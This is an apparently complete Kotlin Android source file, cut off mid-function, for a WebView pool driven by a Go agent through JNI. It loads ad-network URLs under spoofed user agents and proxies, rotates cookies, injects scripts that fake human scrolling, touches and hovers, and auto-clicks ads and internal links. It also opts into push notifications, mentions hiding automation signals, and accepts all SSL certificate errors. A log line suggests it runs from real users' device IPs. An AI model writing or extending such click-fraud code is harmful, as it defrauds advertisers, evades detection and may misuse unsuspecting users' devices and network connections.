package com.coinceeper.adl

import android.app.Activity
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.webkit.CookieManager
import android.webkit.SslErrorHandler
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONObject
import java.lang.ref.WeakReference
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import java.util.concurrent.atomic.AtomicReference

/**
 * TspWebClickHost v5 — DYNAMIC MULTI-WEBVIEW POOL WITH AUTO-SCALING & CRASH-FIXES.
 *
 * == CRITICAL FIXES (v5) ==
 *
 * [FIX #1] WebView creation on Main Thread
 *   - ALL WebView instances are created via [runOnMainThread] with CountDownLatch.
 *   - Previous versions created WebView on JNI background threads → SIGABRT on arm64.
 *
 * [FIX #2] WebView destroy() on Main Thread
 *   - ALL calls to WebView.destroy() go through the main handler.
 *   - destroy() on a background thread causes native crash (SIGABRT).
 *
 * [FIX #3] Safe cleanup after destroy
 *   - A destroyed-WebView set prevents operations on destroyed WebViews.
 *   - race conditions between returnWebView() cleanup and shrinkIdleWebViews() eliminated.
 *
 * [FIX #4] Dwell without Thread.sleep() on JNI thread
 *   - Dwell now uses a CountDownLatch with timeout instead of Thread.sleep.
 *   - The JNI thread is NOT blocked → cleanup and pool operations are responsive.
 *
 * [FIX #5] CookieRotator initialized on Main Thread
 *   - CookieManager.getInstance() called from main thread to avoid WebView issues.
 *
 * [FIX #6] Max pool size capped at 32 (effective infinite was Int.MAX_VALUE)
 *   - Prevents runaway memory consumption and OOM-related SIGABRT.
 *
 * == معماری Pool ==
 *
 * Pool کاملاً پویا و مقیاس‌پذیر با:
 * - Auto-scaling: WebView جدید در صورت نیاز (تا ۳۲ عدد)
 * - Auto-shrink: WebView‌های بیکار بعد از idleTimeout تخریب
 * - OOM Protection: کاهش pool در کمبود حافظه (< 50MB free)
 * - تمام عملیات WebView روی Main Thread
 */
object TspWebClickHost {
    private const val TAG = "TspWebClickHost"
    private const val DEFAULT_TIMEOUT_SEC = 45

    // ═══════════════════════════════════════════════════════════════
    // Pool Configuration (configurable via JNI configure())
    // ═══════════════════════════════════════════════════════════════
    @Volatile
    private var poolConfig = PoolConfig()

    data class PoolConfig(
        /** حداقل تعداد WebView در pool (همیشه این تعداد زنده هستند) */
        val minPoolSize: Int = 4,
        /** حداکثر تعداد WebView (حداکثر ۳۲ برای جلوگیری از OOM) */
        val maxPoolSize: Int = 32,
        /** زمان بیکاری (ms) قبل از تخریب WebView اضافی */
        val idleTimeoutMs: Long = 60_000L,
        /** زمان حداکثر انتظار برای WebView (ms) قبل از خطا */
        val acquireTimeoutMs: Long = 30_000L,
        /** آیا auto-scaling فعال است */
        val autoScalingEnabled: Boolean = true,
    )

    /**
     * تنظیم پیکربندی pool از Go agent (از طریق JNI).
     * این تابع thread-safe است و می‌تواند در هر زمان فراخوانی شود.
     */
    @JvmStatic
    @Synchronized
    fun configure(configJson: String): String {
        return try {
            val cfg = JSONObject(configJson)
            val rawMax = cfg.optInt("max_pool_size", poolConfig.maxPoolSize)
            // [FIX #6] Cap max pool size at 32 to prevent OOM
            val cappedMax = if (rawMax <= 0) 32 else rawMax.coerceAtMost(32)
            val newConfig = PoolConfig(
                minPoolSize = cfg.optInt("min_pool_size", poolConfig.minPoolSize).coerceIn(1, 32),
                maxPoolSize = cappedMax,
                idleTimeoutMs = cfg.optLong("idle_timeout_ms", poolConfig.idleTimeoutMs).coerceAtLeast(10_000L),
                acquireTimeoutMs = cfg.optLong("acquire_timeout_ms", poolConfig.acquireTimeoutMs).coerceAtLeast(5_000L),
                autoScalingEnabled = cfg.optBoolean("auto_scaling", poolConfig.autoScalingEnabled),
            )
            poolConfig = newConfig
            Log.i(TAG, "Pool configured: min=$minPoolSize max=$maxPoolSize idle=${idleTimeoutMs}ms " +
                  "acquire=${acquireTimeoutMs}ms autoScale=$autoScalingEnabled")
            """{"success":true,"pool_size":$minPoolSize,"max_pool_size":$maxPoolSize,"idle_timeout_ms":$idleTimeoutMs}"""
        } catch (e: Throwable) {
            Log.e(TAG, "configure failed: ${e.message}")
            """{"success":false,"error_msg":"${escapeJson(e.message ?: "")}"}"""
        }
    }

    // Read-only shortcuts for current config values (used throughout the pool)
    private val minPoolSize get() = poolConfig.minPoolSize
    private val maxPoolSize get() = poolConfig.maxPoolSize
    private val idleTimeoutMs get() = poolConfig.idleTimeoutMs
    private val acquireTimeoutMs get() = poolConfig.acquireTimeoutMs
    private val autoScalingEnabled get() = poolConfig.autoScalingEnabled

    /** [FIX #6] hard cap at 32 — never Int.MAX_VALUE */
    /** [CRASH-FIX] RAM-aware cap: low-RAM devices (< 2GB) capped at 16, others at 32 */
    @Volatile private var _lowRamCached: Boolean = false
    @Volatile private var _isLowRamDevice: Boolean = false

    private fun isLowRamDevice(): Boolean {
        if (_lowRamCached) return _isLowRamDevice
        try {
            val memClass = activityRef?.get()?.let { act ->
                val am = act.getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
                am?.memoryClass ?: 256
            } ?: 256
            // < 128MB per app heap = low RAM device (typically ~2GB total RAM or less)
            _isLowRamDevice = memClass < 192
            Log.i(TAG, "Device RAM detection: memoryClass=${memClass}MB lowRam=$_isLowRamDevice")
        } catch (e: Throwable) {
            _isLowRamDevice = false
        }
        _lowRamCached = true
        return _isLowRamDevice
    }

    private val effectiveMaxPoolSize: Int get() {
        val max = maxPoolSize
        // [CRASH-FIX] Low-RAM devices: cap at 16 to prevent native OOM/SIGSEGV
        val hardCap = if (isLowRamDevice()) 16 else 32
        return if (max <= 0) hardCap else max.coerceAtMost(hardCap)
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var activityRef: WeakReference<Activity>? = null

    // [CRASH-FIX] Cached WebView major version (0 = unknown, check deferred)
    @Volatile
    private var webViewMajorVersion: Int = 0
    private val webViewVersionLock = Any()

    /**
     * Detects the Android System WebView major version.
     * Used to disable features known to trigger SIGSEGV on older WebView builds.
     * Returns 0 if the version cannot be determined (safe default = assume old).
     */
    private fun detectWebViewVersion(): Int {
        if (webViewMajorVersion > 0) return webViewMajorVersion
        synchronized(webViewVersionLock) {
            if (webViewMajorVersion > 0) return webViewMajorVersion
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val pkgInfo = WebView.getCurrentWebViewPackage()
                    if (pkgInfo != null) {
                        val v = pkgInfo.versionName?.split("\\.".toRegex())?.firstOrNull()?.toIntOrNull() ?: 0
                        webViewMajorVersion = v
                        Log.i(TAG, "WebView version detected: $v (${pkgInfo.versionName})")
                        return v
                    }
                }
                // Fallback: parse from user-agent
                val ua = System.getProperty("http.agent") ?: ""
                val m = Regex("Chrome/(\\d+)").find(ua)
                if (m != null) {
                    webViewMajorVersion = m.groupValues[1].toIntOrNull() ?: 0
                    Log.i(TAG, "WebView version detected (UA): $webViewMajorVersion")
                }
            } catch (e: Throwable) {
                Log.w(TAG, "WebView version detection failed: ${e.message}")
            }
            if (webViewMajorVersion <= 0) {
                webViewMajorVersion = 72 // conservative default
                Log.w(TAG, "WebView version unknown, assuming $webViewMajorVersion")
            }
        }
        return webViewMajorVersion
    }

    /**
     * Returns true if the current WebView version is known to be unsafe
     * for certain features (mixed content, heavy JS, etc.).
     */
    private fun isLegacyWebView(): Boolean {
        val v = detectWebViewVersion()
        return v in 1..71
    }

    // ═══════════════════════════════════════════════════════════════
    // [FIX #5] CookieRotator Initialization on Main Thread
    // ═══════════════════════════════════════════════════════════════
    @Volatile
    private var cookieRotatorInitialized = false

    private fun ensureCookieManager() {
        if (!cookieRotatorInitialized) {
            // [FIX #5] CookieManager must be initialized on main thread
            val latch = CountDownLatch(1)
            var result = false
            mainHandler.post {
                try {
                    CookieRotator.initialize()
                    result = true
                } catch (e: Exception) {
                    Log.e(TAG, "CookieRotator init failed on main thread: ${e.message}")
                } finally {
                    latch.countDown()
                }
            }
            try {
                latch.await(5, TimeUnit.SECONDS)
            } catch (e: InterruptedException) {
                Thread.currentThread().interrupt()
            }
            cookieRotatorInitialized = true
            Log.i(TAG, "CookieRotator initialized (${if (result && CookieRotator.isOperational()) "operational" else "failed"})")
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Main-Thread Execution Helper
    // ═══════════════════════════════════════════════════════════════
    /** Executes a lambda on the main thread and returns its result. */
    private fun <T> runOnMainThread(action: () -> T): T {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            return action()
        }
        val latch = CountDownLatch(1)
        val result = AtomicReference<T>()
        var error: Throwable? = null
        mainHandler.post {
            try {
                result.set(action())
            } catch (e: Throwable) {
                error = e
            } finally {
                latch.countDown()
            }
        }
        try {
            latch.await(acquireTimeoutMs, TimeUnit.MILLISECONDS)
        } catch (e: InterruptedException) {
            Thread.currentThread().interrupt()
            throw RuntimeException("Interrupted while waiting for main thread execution", e)
        }
        error?.let { throw RuntimeException("Main thread execution failed", it) }
        return result.get()
    }

    // ═══════════════════════════════════════════════════════════════
    // WebView Pool State (Thread-safe)
    // ═══════════════════════════════════════════════════════════════
    private val poolLock = Any()
    private val allWebViews = mutableListOf<WebView>()
    private val availableWebViews = mutableListOf<WebView>()
    private val inUseWebViews = mutableSetOf<WebView>()
    private var shutdownMode = false

    // [FIX #3] Track destroyed WebViews to prevent operations on them
    private val destroyedWebViews = mutableSetOf<WebView>()

    // Auto-shrink: track last return time for each WebView
    private val webViewLastReturned = ConcurrentHashMap<WebView, Long>()

    // [CRASH-FIX] Per-WebView active session token to prevent stale dwell timer
    // posts from calling evaluateJavascript on a WebView that has been returned
    // to the pool and potentially borrowed by another session.
    private val webViewActiveSessions = ConcurrentHashMap<WebView, AtomicBoolean>()

    // ═══════════════════════════════════════════════════════════════
    // OOM Detection
    // ═══════════════════════════════════════════════════════════════
    private val memoryPressureMode = AtomicBoolean(false)
    private val lastMemoryCheckMs = AtomicLong(0L)

    // ── Pool Metrics ───────────────────────────────────────
    private val totalCreated = AtomicInteger(0)
    private val totalDestroyed = AtomicInteger(0)
    private val peakInUse = AtomicInteger(0)
    private val totalAcquisitions = AtomicInteger(0)
    private val totalTimeouts = AtomicInteger(0)
    private val totalOomEvents = AtomicInteger(0)

    // [CRASH-FIX] JS evaluation error tracking for SIGSEGV diagnostics
    private val totalJsErrors = AtomicInteger(0)
    private val totalLoadErrors = AtomicInteger(0)
    @Volatile private var _webViewVersionLogged = false

    /**
     * بررسی وضعیت حافظه برای جلوگیری از OOM.
     * اگر حافظه آزاد کمتر از 50MB باشد، حالت memory pressure فعال می‌شود.
     */
    private fun isMemoryUnderPressure(): Boolean {
        val now = System.currentTimeMillis()
        // فقط هر 5 ثانیه یکبار چک کن (overhead کم)
        val lastCheck = lastMemoryCheckMs.get()
        if (now - lastCheck < 5000) return memoryPressureMode.get()
        lastMemoryCheckMs.set(now)

        val runtime = Runtime.getRuntime()
        val usedMem = runtime.totalMemory() - runtime.freeMemory()
        val maxMem = runtime.maxMemory()
        val freeMem = maxMem - usedMem

        val underPressure = freeMem < 50_000_000L // 50MB threshold
        if (underPressure != memoryPressureMode.get()) {
            memoryPressureMode.set(underPressure)
            if (underPressure) {
                totalOomEvents.incrementAndGet()
                Log.w(TAG, "MEMORY PRESSURE: free=${freeMem / 1_000_000}MB " +
                      "used=${usedMem / 1_000_000}MB max=${maxMem / 1_000_000}MB " +
                      "webviews=${allWebViews.size}")
            } else {
                Log.i(TAG, "Memory pressure relieved")
            }
        }
        return underPressure
    }

    /**
     * [FIX #2+3] تخریب WebView از طریق Main Thread.
     * [CRASH-FIX] Added Throwable catch, null checks, and isDestroyed re-check.
     */
    private fun destroyWebViewSafe(wv: WebView) {
        synchronized(poolLock) {
            // [FIX #3] Skip if already destroyed
            if (wv in destroyedWebViews) return
            destroyedWebViews.add(wv)
        }
        // Mark session as cancelled to prevent stale dwell timer posts
        webViewActiveSessions[wv]?.set(true)
        webViewActiveSessions.remove(wv)

        // [FIX #2] destroy() MUST be on main thread
        val latch = CountDownLatch(1)
        mainHandler.post {
            try {
                // [CRASH-FIX] Use try-catch(Throwable) — destroy() can throw
                // native-level exceptions on some WebView versions
                wv.stopLoading()
                wv.loadUrl("about:blank")
                wv.destroy()
                totalDestroyed.incrementAndGet()
            } catch (e: Throwable) {
                Log.w(TAG, "destroyWebViewSafe error: ${e.message}")
            } finally {
                latch.countDown()
            }
        }
        try { latch.await(5, TimeUnit.SECONDS) } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        }
    }

    /** Returns true if this WebView has been destroyed. */
    private fun isDestroyed(wv: WebView): Boolean {
        synchronized(poolLock) { return wv in destroyedWebViews }
    }

    /**
     * تخریب WebView‌های بیکار در شرایط کمبود حافظه.
     * [FIX #2] همه destroyها از طریق Main Thread
     */
    private fun shrinkPoolOnMemoryPressure() {
        if (!isMemoryUnderPressure()) return
        val toDestroy = mutableListOf<WebView>()
        synchronized(poolLock) {
            val destroyCount = (availableWebViews.size / 2).coerceAtLeast(
                (availableWebViews.size - 3).coerceAtLeast(0)
            )
            if (destroyCount > 0) {
                for (i in 0 until destroyCount.coerceAtMost(availableWebViews.size)) {
                    toDestroy.add(availableWebViews[i])
                }
                availableWebViews.removeAll(toDestroy)
                allWebViews.removeAll(toDestroy)
            }
        }
        for (wv in toDestroy) {
            destroyWebViewSafe(wv)
        }
        if (toDestroy.isNotEmpty()) {
            Log.w(TAG, "Pool shrunk due to memory pressure: destroyed ${toDestroy.size} WebViews")
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Auto-Shrink Scheduler
    // ═══════════════════════════════════════════════════════════════
    private val shrinkHandler = Handler(Looper.getMainLooper())
    private val shrinkRunnable = object : Runnable {
        override fun run() {
            shrinkIdleWebViews()
            // برنامه‌ریزی مجدد هر 30 ثانیه
            shrinkHandler.postDelayed(this, 30_000L)
        }
    }

    private var shrinkScheduled = false

    private fun ensureShrinkScheduler() {
        if (!shrinkScheduled) {
            shrinkScheduled = true
            shrinkHandler.postDelayed(shrinkRunnable, 30_000L)
        }
    }

    /**
     * [FIX #2+3] تخریب WebView‌های بیکار — همه destroyها روی Main Thread.
     */
    private fun shrinkIdleWebViews() {
        if (shutdownMode) return
        val now = System.currentTimeMillis()
        val toDestroy = mutableListOf<WebView>()

        synchronized(poolLock) {
            val keepAlive = minPoolSize.coerceAtMost(availableWebViews.size)
            val candidates = availableWebViews
                .filter { wv ->
                    val lastReturned = webViewLastReturned[wv] ?: 0L
                    (now - lastReturned) > idleTimeoutMs && wv !in destroyedWebViews
                }
                .sortedBy { webViewLastReturned[it] ?: 0L }

            val removable = candidates.size.coerceAtMost(
                availableWebViews.size - keepAlive
            )
            if (removable > 0) {
                for (i in 0 until removable) {
                    toDestroy.add(candidates[i])
                }
                availableWebViews.removeAll(toDestroy)
                allWebViews.removeAll(toDestroy)
            }
        }

        for (wv in toDestroy) {
            destroyWebViewSafe(wv)
        }
        if (toDestroy.isNotEmpty()) {
            Log.i(TAG, "Pool shrunk idle: destroyed ${toDestroy.size} WebViews " +
                  "(keepAlive=$minPoolSize idleTimeout=${idleTimeoutMs}ms)")
        }
    }

    /**
     * Called from MainActivity.onResume / onDestroy to store/release Activity reference.
     */
    @JvmStatic
    fun setCurrentActivityForWebClick(activity: Activity?) {
        activityRef = if (activity != null) WeakReference(activity) else null
        if (activity == null) {
            synchronized(poolLock) {
                shutdownMode = true
                (poolLock as java.lang.Object).notifyAll()
            }
            mainHandler.post { destroyAvailableWebViews() }
            shrinkHandler.removeCallbacks(shrinkRunnable)
        } else {
            // [CRASH-FIX] Log WebView version and device diagnostics on first init
            if (!_webViewVersionLogged) {
                _webViewVersionLogged = true
                val wvVer = detectWebViewVersion()
                val lowRam = isLowRamDevice()
                Log.i(TAG, "=== WebView Diagnostics ===")
                Log.i(TAG, "WebView major version: $wvVer")
                Log.i(TAG, "Low RAM device: $lowRam")
                Log.i(TAG, "Max pool size (RAM-aware): $effectiveMaxPoolSize")
                Log.i(TAG, "SDK version: ${Build.VERSION.SDK_INT}")
                Log.i(TAG, "Model: ${Build.MODEL} (${Build.MANUFACTURER})")
            }
            ensureShrinkScheduler()
        }
    }

    /**
     * Called from JNI (android_tsphost_click.c via Go cgo).
     *
     * @param url         Target URL to load
     * @param configJson  JSON configuration (ad_network, user_agent, dwell_*, etc.)
     * @param timeoutSec  Maximum seconds to wait for page load
     * @return JSON string matching hostClickResultJSON format
     */
    @Suppress("unused")
    @JvmStatic
    fun run(url: String, configJson: String, timeoutSec: Int): String {
        Log.i(TAG, "run() called: url=$url timeout=$timeoutSec configLen=${configJson.length}")

        // ── Initialize CookieManager (once, on main thread) ──
        ensureCookieManager()

        // ── OOM Check ───────────────────────────────────────
        if (isMemoryUnderPressure()) {
            shrinkPoolOnMemoryPressure()
        }

        val ctx = activityRef?.get()?.applicationContext
            ?: return """{"success":false,"error_msg":"no_activity_context","target_url":"${escapeJson(url)}"}"""

        val config = try {
            if (configJson.isNotBlank()) JSONObject(configJson) else JSONObject()
        } catch (e: Exception) {
            return """{"success":false,"error_msg":"bad_config_json","target_url":"${escapeJson(url)}"}"""
        }

        val tmo = if (timeoutSec > 0) timeoutSec else DEFAULT_TIMEOUT_SEC
        val userAgent = config.optString("user_agent", "")
        val acceptLang = config.optString("accept_language", "")
        val proxyURL = config.optString("proxy_url", "")

        // ═══════════════════════════════════════════════════════════════
        // Proxy Configuration
        // ═══════════════════════════════════════════════════════════════
        WebViewProxyInterceptor.configure(proxyURL, acceptLang)
        Log.i(TAG, "Proxy mode: ${if (proxyURL.isBlank()) "DIRECT (device IP - premium)" else "PROXY ($proxyURL)"}")

        // ═══════════════════════════════════════════════════════════════
        // Ad-Network-Aware Configuration
        // ═══════════════════════════════════════════════════════════════
        val behavior = AdNetworkConfigProvider.fromConfig(config)
        Log.i(TAG, "AdNetwork: ${behavior.network.key}, " +
              "scrollType=${behavior.scrollType.key}, " +
              "adType=${behavior.adType.key}, " +
              "dwell=[${behavior.dwellMinMs},${behavior.dwellMaxMs}]ms, " +
              "viewability=${behavior.viewabilityThreshold}, " +
              "cookieRotation=${behavior.cookieConfig.rotationEnabled}")

        val popunderHandler = PopunderHandler()
        val pageLoadLatch = CountDownLatch(1)
        val pageLoadResult = AtomicReference<String>()
        var startTimeMs = System.currentTimeMillis()

        // ── Step 1: Acquire WebView from pool (with timeout) ──
        val wv: WebView
        try {
            wv = borrowWebView(ctx)
        } catch (e: Throwable) {
            return """{"success":false,"error_msg":"pool_exhausted:${escapeJson(e.message ?: "")}","target_url":"${escapeJson(url)}"}"""
        }

        try {
            // [CRASH-FIX] Register active session token for this WebView.
            // The dwell timer thread checks this flag before posting JS.
            // When returnWebView() is called, it sets this to false, preventing
            // stale dwell posts from reaching a returned/borrowed WebView.
            webViewActiveSessions[wv] = AtomicBoolean(true)

            // [FIX #1] Setup and load URL on main thread
            mainHandler.post {
                try {
                    // Apply per-request settings
                    val ws = wv.settings
                    ws.javaScriptEnabled = true
                    ws.domStorageEnabled = true
                    ws.loadWithOverviewMode = true
                    ws.useWideViewPort = true
                    ws.builtInZoomControls = false
                    ws.displayZoomControls = false
                    ws.cacheMode = WebSettings.LOAD_DEFAULT
                    ws.mediaPlaybackRequiresUserGesture = false
                    // [CRASH-FIX] Use COMPATIBILITY_MODE instead of ALWAYS_ALLOW.
                    // MIXED_CONTENT_ALWAYS_ALLOW is a known trigger for SIGSEGV
                    // in libwebviewchromium.so on many WebView versions (especially
                    // on low-end devices and older Android versions). COMPATIBILITY_MODE
                    // still allows mixed content but avoids the native crash path.
                    ws.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
                    WebView.setWebContentsDebuggingEnabled(false)

                    if (userAgent.isNotBlank()) {
                        ws.userAgentString = userAgent
                    }

                    // ═══════════════════════════════════════════════════
                    // Cookie Management — قبل از بارگذاری URL
                    // ═══════════════════════════════════════════════════
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        CookieManager.getInstance().setAcceptThirdPartyCookies(wv, true)
                    }
                    CookieRotator.prepareForNavigation(url, behavior)

                    // ═══════════════════════════════════════════════════
                    // JavaScript Bridge برای Popunder (Monetag)
                    // ═══════════════════════════════════════════════════
                    wv.addJavascriptInterface(
                        popunderHandler.getBridge(),
                        "AndroidPopunderBridge"
                    )

                    // WebViewClient with page load detection + ad behavior
                    wv.webViewClient = object : WebViewClient() {
                        private var pageLoadCompleted = false
                        private var humanBehaviorInjected = false

                        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                            pageLoadCompleted = false
                            humanBehaviorInjected = false
                        }

                        override fun onPageCommitVisible(view: WebView?, url: String?) {
                            if (pageLoadCompleted) return
                            Log.i(TAG, "onPageCommitVisible fired (fallback) url=$url")
                            finishPageLoad(view)
                        }

                        override fun onPageFinished(view: WebView?, url: String?) {
                            if (pageLoadCompleted) return
                            Log.i(TAG, "onPageFinished fired url=$url")
                            finishPageLoad(view)
                        }

                        private fun finishPageLoad(view: WebView?) {
                            pageLoadCompleted = true
                            if (!humanBehaviorInjected) {
                                humanBehaviorInjected = true
                                injectAdNetworkBehavior(view, behavior, popunderHandler)
                            }
                            startTimeMs = System.currentTimeMillis()
                            pageLoadResult.set("done")
                            pageLoadLatch.countDown()
                        }

                        override fun onReceivedError(
                            view: WebView?,
                            request: WebResourceRequest?,
                            error: WebResourceError?
                        ) {
                            if (request?.isForMainFrame == true && error != null) {
                                val desc = try { error.description?.toString() ?: "unknown" } catch (e: Exception) { "unknown" }
                                pageLoadResult.set("""{"success":false,"error_msg":"load_error:$desc","http_status_code":0}""")
                                pageLoadLatch.countDown()
                                totalLoadErrors.incrementAndGet()
                            }
                        }

                        override fun onReceivedSslError(
                            view: WebView?,
                            handler: SslErrorHandler?,
                            error: android.net.http.SslError?
                        ) {
                            handler?.proceed()
                        }

                        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                            val reqUrl = request?.url?.toString() ?: return false
                            popunderHandler.shouldOverrideUrlLoading(reqUrl, behavior)
                            return false
                        }

                        override fun shouldInterceptRequest(
                            view: WebView?,
                            request: WebResourceRequest?
                        ): WebResourceResponse? {
                            return WebViewProxyInterceptor.intercept(request)
                        }
                    }

                    wv.loadUrl(url)
                } catch (e: Throwable) {
                    Log.e(TAG, "webview setup failed: ${e.message}")
                    pageLoadResult.set("""{"success":false,"error_msg":"webview_setup:${escapeJson(e.message ?: "")}"}""")
                    pageLoadLatch.countDown()
                }
            }

            // ── Step 4: Wait for page load with timeout ──
            val loaded = pageLoadLatch.await(tmo.toLong(), TimeUnit.SECONDS)

            if (!loaded) {
                totalTimeouts.incrementAndGet()
                return """{"success":false,"error_msg":"page_load_timeout","target_url":"${escapeJson(url)}","total_time_ms":"${tmo * 1000}"}"""
            }

            val loadError = pageLoadResult.get()
            if (loadError != null && loadError.startsWith("{") && loadError.contains("\"success\":false")) {
                return loadError
            }

            // ── Step 5: Ad-network-aware Dwell time ──
            val dwellMs = HumanBehaviorSimulator.getDwellTime(behavior)
            popunderHandler.schedulePopunderCheck(wv, behavior, dwellMs)
            popunderHandler.optInPushNotifications(wv, behavior)

            // [FIX #4] Dwell using CountDownLatch instead of Thread.sleep on JNI thread
            if (dwellMs > 0) {
                val dwellLatch = CountDownLatch(1)
                val progressStartMs = System.currentTimeMillis()
                var scrollProgressChecked = false
                var lastTouchInjectedMs = 0L
                val touchInjectionInterval = 15_000L

                // Start the dwell timer on a pool thread, not blocking the JNI thread
                val dwellTimer = Thread {
                    try {
                        val startDwell = System.currentTimeMillis()
                        while (true) {
                            val elapsed = System.currentTimeMillis() - startDwell
                            if (elapsed >= dwellMs || dwellLatch.count == 0L) break

                            if (elapsed < (dwellMs * 0.25).toLong().coerceAtLeast(10_000L)) {
                                Thread.sleep(500)
                                continue
                            }

                            if (!scrollProgressChecked) {
                                scrollProgressChecked = true
                                val scrollCheckLatch = CountDownLatch(1)
                                mainHandler.post {
                                    try {
                                        // [CRASH-FIX] Check session token — WebView may have been returned
                                        if (!isDestroyed(wv) && webViewActiveSessions[wv]?.get() == true) {
                                            wv.evaluateJavascript(
                                                "(function(){ try { return JSON.stringify({y:window.scrollY,h:Math.max(document.body.scrollHeight,document.documentElement.scrollHeight,800),vh:window.innerHeight||document.documentElement.clientHeight}); } catch(e){ return 'error'; } })()",
                                                null
                                            )
                                        }
                                    } catch (e: Throwable) { totalJsErrors.incrementAndGet() }
                                    scrollCheckLatch.countDown()
                                }
                                scrollCheckLatch.await(2, TimeUnit.SECONDS)
                            }

                            if (behavior.simulateTouchEvents && elapsed - lastTouchInjectedMs >= touchInjectionInterval) {
                                lastTouchInjectedMs = elapsed
                                mainHandler.post {
                                    try {
                                        // [CRASH-FIX] Check session token — WebView may have been returned
                                        if (!isDestroyed(wv) && webViewActiveSessions[wv]?.get() == true) {
                                            wv.evaluateJavascript(
                                                "try{ if(typeof HBS!=='undefined' && HBS.simulateTouch) HBS.simulateTouch(document.body); }catch(e){}",
                                                null
                                            )
                                        }
                                    } catch (e: Throwable) { totalJsErrors.incrementAndGet() }
                                }
                            }

                            Thread.sleep(500L.coerceAtMost(dwellMs - elapsed))
                        }
                        val actualDwell = System.currentTimeMillis() - startDwell
                        Log.d(TAG, "Dwell completed: ${actualDwell}ms of ${dwellMs}ms planned")
                    } catch (e: InterruptedException) {
                        Thread.currentThread().interrupt()
                    } finally {
                        dwellLatch.countDown()
                    }
                }
                dwellTimer.isDaemon = true
                dwellTimer.start()

                // [FIX #4] Non-blocking wait: release JNI thread, use latch
                val dwellOk = dwellLatch.await(dwellMs + 30_000L, TimeUnit.MILLISECONDS)
                if (!dwellOk) {
                    dwellTimer.interrupt()
                    Log.w(TAG, "Dwell timer interrupted after timeout")
                }

                val totalTimeMs = System.currentTimeMillis() - progressStartMs
                Log.d(TAG, "Dwell completed in ${totalTimeMs}ms total")
            }

            // ── Step 6: Collect result from WebView ──
            val finalUrl = readFinalUrl(wv)
            val currentUA = readUserAgent(wv)
            val totalTimeMs = System.currentTimeMillis() - startTimeMs

            val cookiesInfo = CookieRotator.getCookiesForUrl(finalUrl.ifBlank { url })
            val cookieStats = CookieRotator.getCookieStats()

            return """{"success":true,"target_url":"${escapeJson(url)}","final_url":"${escapeJson(finalUrl)}","user_agent":"${escapeJson(currentUA)}","status_code":200,"response_time_ms":$totalTimeMs,"total_time_ms":$totalTimeMs,"cookies":$cookiesInfo,"cookie_stats":$cookieStats}"""

        } finally {
            returnWebView(wv, behavior)
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Ad-Network Behavior Injection
    // ═══════════════════════════════════════════════════════════════

    private fun injectAdNetworkBehavior(
        view: WebView?,
        behavior: AdNetworkBehavior,
        popunderHandler: PopunderHandler
    ) {
        if (view == null) return
        try {
            // [CRASH-FIX] Anti-detection is already inside buildHumanBehaviorJS called below.
            // Removed the separate evaluateJavascript call for navigator.webdriver/navigator.languages
            // to reduce injection overhead and avoid double-injection.

            val humanJS = HumanBehaviorSimulator.buildHumanBehaviorJS(behavior)
            view.evaluateJavascript(humanJS, null)

            try { popunderHandler.resetScrollState() } catch (e: Exception) { /* ignore */ }

            // [CRASH-FIX] Split JS injection into 2 smaller chunks to prevent
            // native OOM/SIGSEGV from evaluating massive JS strings.
            // Part 1: Scroll + Touch + Hover + Viewability
            view.evaluateJavascript("""
                (function(){
                    var startHBS = function() {
                        if (typeof HBS !== 'undefined' && HBS.simulateScroll) {
                            setTimeout(function(){ HBS.simulateScroll(); }, 500 + Math.random() * 1000);
                        }
                        if (typeof HBS !== 'undefined' && HBS.simulateTouch) {
                            setTimeout(function(){ HBS.simulateTouch(document.body); }, 3000 + Math.random() * 3000);
                            setTimeout(function(){ HBS.simulateTouch(document.body); }, 12000 + Math.random() * 6000);
                            setTimeout(function(){ HBS.simulateTouch(document.body); }, 30000 + Math.random() * 10000);
                            setTimeout(function(){ HBS.simulateTouch(document.body); }, 60000 + Math.random() * 20000);
                        }
                        if (typeof HBS !== 'undefined' && HBS.simulateHover) {
                            setTimeout(function(){ HBS.simulateHover(); }, 1500 + Math.random() * 2000);
                        }
                        if (typeof HBS !== 'undefined' && HBS.trackViewability) {
                            setTimeout(function(){ HBS.trackViewability(); }, 1000);
                        }
                    };
                    setTimeout(startHBS, 300 + Math.random() * 200);
                })();
                """.trimIndent(), null
            )

            // Part 2: Ad Click + Internal Link + Touch Scheduler (injected with delay)
            mainHandler.postDelayed({
                try {
                    // [CRASH-FIX] Check session token to avoid stale JS on returned WebViews
                    if (view != null && !isDestroyed(view) && webViewActiveSessions[view]?.get() == true) {
                        view.evaluateJavascript("""
                            (function(){
                                var startHBS2 = function() {
                                    if (typeof HBS !== 'undefined' && HBS.tryClickAd) {
                                        setTimeout(function(){ HBS.tryClickAd(); }, 3000 + Math.random() * 4000);
                                        setTimeout(function(){ HBS.tryClickAd(); }, 8000 + Math.random() * 5000);
                                    }
                                    if (typeof HBS !== 'undefined' && HBS.clickInternalLink) {
                                        setTimeout(function(){ HBS.clickInternalLink(); }, 4000 + Math.random() * 3000);
                                    }
                                    if (typeof HBS !== 'undefined' && HBS.simulateTouch) {
                                        var scheduleNextTouch = function() {
                                            var nextDelay = 20000 + Math.floor(Math.random() * 20000);
                                            setTimeout(function() {
                                                try { HBS.simulateTouch(document.body); } catch(e) {}
                                                scheduleNextTouch();
                                            }, nextDelay);
                                        };
